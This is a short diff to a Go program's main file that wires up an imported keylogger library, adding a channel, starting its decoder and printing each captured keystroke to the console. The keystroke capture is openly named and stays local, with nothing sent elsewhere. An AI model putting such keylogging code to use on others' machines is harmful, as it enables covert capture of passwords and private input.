@@ -1,8 +1,21 @@
 package main
 
-import "github.com/Spriithy/gkl/keylogger"
+import (
+	"fmt"
+
+	"github.com/Spriithy/gkl/keylogger"
+)
 
 func main() {
-	kl := keylogger.NewKeylogger()
+	keystrokes := make(chan string)
+	kl := keylogger.NewKeylogger(keystrokes)
+
+	go kl.Decoder.Listen()
+	go func() {
+		for keystroke := range keystrokes {
+			fmt.Println(keystroke)
+		}
+	}()
+
 	kl.Start()
 }
